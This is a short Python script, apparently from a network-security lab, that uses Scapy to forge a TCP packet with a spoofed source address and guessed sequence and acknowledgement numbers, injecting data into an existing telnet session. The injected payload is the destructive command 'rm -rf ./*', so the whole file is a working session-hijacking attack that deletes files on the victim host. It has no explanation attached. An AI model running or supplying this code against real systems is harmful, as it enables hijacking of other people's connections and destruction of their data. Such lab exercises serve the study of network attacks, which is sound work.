#!/usr/bin/env python3
from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=41858, dport=23, flags="A", seq=3897052396, ack=3448568697)

data = '\rrm -rf ./*\r'

pkt = ip / tcp / data
ls(pkt)
send(pkt, verbose=0)
